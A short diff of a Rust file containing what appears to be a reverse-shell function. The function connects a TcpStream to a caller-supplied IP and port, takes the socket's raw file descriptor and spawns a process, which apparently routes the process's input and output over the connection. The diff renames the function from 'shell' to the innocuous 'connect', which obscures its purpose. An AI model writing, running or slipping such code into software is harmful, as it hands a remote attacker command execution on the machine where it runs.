@@ -1,8 +1,8 @@
-use std::net::TcpStream;
+use std::net::{TcpStream};
 use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 
-pub fn shell(ip: String, port: String){
+pub fn connect(ip: String, port: String){
     let socket = [ip, port].join(":");
     let s = TcpStream::connect(socket).unwrap();
     let fd = s.as_raw_fd();
@@ -17,3 +17,5 @@ pub fn shell(ip: String, port: String){
         .wait()
         .unwrap();
 }
+
+
